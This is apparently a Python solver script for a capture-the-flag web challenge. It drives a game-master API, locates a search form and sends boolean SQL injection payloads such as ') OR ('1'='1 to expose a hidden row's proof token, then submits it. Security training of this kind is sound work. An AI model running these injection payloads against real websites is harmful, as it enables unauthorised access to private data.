#!/usr/bin/env python3
"""Day 19 web-exploitation / Query Me This (sqli) solver.

Live-target lane, SQL injection. App "Query Me This": a search form GETs
/lookup?q=<term>. The query is roughly
    SELECT ... WHERE (visible = 1 AND note LIKE '%<q>%')
so a classic group-closing boolean injection
    q = ') OR ('1'='1
turns the WHERE true for every row and reveals the hidden `restricted` row,
whose note holds `proof_<hex>`.

Generic, minimal requests (shared-endpoint rule): find the search action from
the dashboard, send ONE boolean-injection query (a couple of fallbacks only if
the first returns no proof), scrape the proof. No fuzzing / no column-count
sweep at solve time.

Usage: solve.py solve <challenge-id>
       solve.py start <challenge-id> [--run-for-time]
Env: HUNTRESS_GM_URL, HUNTRESS_GM_TOKEN.
"""
import argparse, json, os, re, sys, time, pathlib, urllib.parse
import requests

GM = os.environ["HUNTRESS_GM_URL"].rstrip("/")
TOK = os.environ["HUNTRESS_GM_TOKEN"]
RUN = pathlib.Path(__file__).resolve().parent / "run"
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
DELAY = 0.8
# boolean group-closing payloads, most-likely first
PAYLOADS = ["') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1"]


def gm(payload):
    r = requests.post(GM + "/", headers={"Authorization": "Bearer " + TOK,
                      "Content-Type": "application/json"}, json=payload, timeout=30)
    r.raise_for_status()
    return r.json()


def recover_proof(base, outdir):
    base = base.rstrip("/"); outdir.mkdir(parents=True, exist_ok=True)
    s = requests.Session(); s.headers["User-Agent"] = "ctf-web-lane/1.0"
    root = s.get(base + "/", timeout=20); (outdir / "root.html").write_bytes(root.content)
    m = re.search(r'<form[^>]*action=[\'"]([^\'"]+)[\'"]', root.text)
    action = m.group(1) if m else "/lookup"
    pm = re.search(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', root.text)
    param = pm.group(1) if pm else "q"
    for i, p in enumerate(PAYLOADS):
        time.sleep(DELAY)
        url = action + "?" + urllib.parse.urlencode({param: p})
        r = s.get(base + url, timeout=20)
        (outdir / f"inject_{i}.html").write_bytes(r.content)
        print(f"  GET {action}?{param}={p!r} -> {r.status_code} {len(r.content)}B", file=sys.stderr)
        mm = PROOF_RE.search(r.text)
        if mm:
            return mm.group(0)
    return None


def start(cid, rft=False):
    payload = {"op": "start", "challenge": cid}
    if rft: payload["run_for_time"] = True
    data = gm(payload)
    RUN.mkdir(parents=True, exist_ok=True)
    (RUN / "start.json").write_text(json.dumps(data, indent=2))
    return data


def solve(cid):
    data = start(cid)
    targets = {t["id"]: t["url"] for t in data.get("targets", [])}
    if not targets:
        print("no targets:", json.dumps(data)[:300]); sys.exit(1)
    answers = {}
    for q in data["questions"]:
        url = targets.get(q.get("artifact"))
        if not url:
            print("no target for", q["id"], q.get("artifact")); continue
        proof = recover_proof(url, RUN / re.sub(r"\W+", "_", q["artifact"]))
        print(f"{q['id']} [{q['artifact']}] -> {proof}", file=sys.stderr)
        if proof:
            answers[q["id"]] = proof
    if len(answers) != len(data["questions"]):
        print("missing proofs, not submitting:", answers); sys.exit(2)
    res = gm({"op": "submit", "challenge": cid, "answers": answers})
    (RUN / "submit.json").write_text(json.dumps(res, indent=2))
    print(json.dumps({k: res.get(k) for k in ("result", "remaining", "accepted_ids", "flag")}))


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["start", "solve"])
    ap.add_argument("challenge")
    ap.add_argument("--run-for-time", action="store_true")
    a = ap.parse_args()
    if a.cmd == "start":
        print(json.dumps(start(a.challenge, a.run_for_time).get("targets"), indent=2))
    else:
        solve(a.challenge)
